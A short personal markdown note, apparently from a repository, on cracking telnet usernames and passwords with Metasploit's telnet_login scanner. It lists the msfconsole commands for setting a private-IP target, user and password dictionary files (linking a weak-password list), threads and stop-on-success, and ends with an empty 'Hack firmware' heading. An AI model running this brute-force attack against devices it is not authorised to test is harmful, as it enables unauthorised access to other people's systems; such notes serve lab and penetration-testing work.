# note

## Telnet user and password crack

### Metasploit

[metasplot for archlinuxarm](https://gitee.com/yjun123/alarm-pkgbuilds/tree/master/metasploit)

- start metasploit 

execute `msfconsole`

- user telnet auxiliary 

type `use auxiliary/scanner/telnet/telnet_login`

- get user/pass dictionary

[TgeaUs/Weak-password[(https://github.com/TgeaUs/Weak-password)

- set option

```
set rhosts 192.168.10.123 # set target host
set user_file 常用 # set username dictionary
set pass_file 常用 # set password dictionary
set stop_on_success true
set THREADS 4 # set thread to crack
```
- start exploit

execute `run/exploit`

### Hack firmware


